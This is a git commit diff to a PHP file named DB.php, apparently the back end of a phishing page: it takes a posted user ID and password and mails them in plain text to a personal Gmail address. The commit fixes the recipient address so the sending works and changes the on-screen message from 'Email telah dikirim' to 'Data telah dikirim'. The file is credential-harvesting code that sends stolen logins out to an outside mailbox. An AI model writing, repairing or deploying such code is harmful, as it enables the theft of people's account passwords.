fb967277ce896d828e72a2e814cf226e8793d563
Moell <54074200+muliono46@users.noreply.github.com>
2023-12-24 23:55:06 +0700

    Update DB.php

--- DB.php
+++ DB.php
@@ -4,13 +4,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $id = $_POST["id"];
     $password = $_POST["password"];
 
-    $to = "imoell10101988@gmail.com.com";
+    $to = "imoell10101988@gmail.com";
     $subject = "Data Pengguna Masuk";
     $message = "ID Pengguna: $id\nPassword: $password";
 
     mail($to, $subject, $message);
 
-    echo "Email telah dikirim.";
+    echo "Data telah dikirim.";
 } else {
     echo "Permintaan tidak valid.";
 }
